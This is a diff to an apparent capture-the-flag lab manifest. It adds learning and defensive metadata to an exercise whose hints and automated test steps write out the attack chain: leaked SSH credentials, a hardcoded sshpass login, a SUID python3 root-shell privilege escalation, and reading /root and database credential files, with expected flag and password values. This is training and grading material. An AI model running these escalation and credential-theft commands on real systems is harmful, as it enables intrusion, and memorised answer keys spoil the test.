@@ -17,6 +17,32 @@ mapped_skills:
 assessment_criteria:
   - Submit the correct flag.
   - Pass every automated test step in the lab manifest.
+learning_concepts:
+  - "security assessment"
+  - "evidence collection"
+  - "reporting"
+  - "zenith global - capstone ctf"
+  - "comprehensive reconnaissance across multiple target systems"
+competency_tags:
+  - "assessment.capstone_ctf"
+  - "incident.forensics"
+  - "network.systems"
+  - "assessment.fundamentals"
+defensive_skills:
+  - "disable_unused_services"
+  - "enforce_key_based_ssh_with_least_privilege"
+  - "alert_on_unexpected_authentication_or_command_execution"
+evidence_required:
+  - "flag"
+  - "findings"
+  - "evidence_index"
+  - "report"
+report_questions:
+  - "Which finding is best supported by the evidence?"
+  - "What does the evidence not prove?"
+  - "Which control would have prevented or detected the issue?"
+  - "What would you record before escalating?"
+
 mitre_attack:
   - tactic: Initial Access
     technique: T1190
@@ -71,7 +97,7 @@ hints:
       Frontend: curl http://<webfront>/api/orders/7 - gives SSH creds
       Also: curl http://<webfront>/api/config (broken access) - marker 1
       Appserver: ssh appuser@<appserver> with discovered password.
-      Privesc: python3 -c "import os;os.setuid(0);os.system('/bin/sh')"
+      Privesc: python3 -c "import os;os.setuid(0);os.system('/bin/sh')"  # security-delta: allow os.system - intentional privesc fixture
       Marker 2 in /root/marker.txt. DB creds in /opt/zenith/db.conf.
       Datastore: mysql -h <datastore> -u zenith_app -p'...' zenith -e "SELECT * FROM flags"
     unlock_after_minutes: 70
@@ -132,7 +158,7 @@ topology:
       access: "internal"
 
 troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
-defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
+defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution. In this lab, apply that to zenith global - capstone ctf and record the evidence before recommending the fix."
 test:
   steps:
     - name: "Web frontend responds"
@@ -153,12 +179,12 @@ test:
       timeout: 15
 
     - name: "Privesc via SUID python3 and read marker 2"
-      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>&1"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>&1"  # security-delta: allow os.system - intentional privesc fixture
       expect: "pwn3d"
       timeout: 15
 
     - name: "Extract DB credentials from appserver config"
-      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>&1 | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>&1 | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"  # security-delta: allow os.system - intentional privesc fixture
       expect: "Z3n_DB_Pr0d#"
       timeout: 15
 
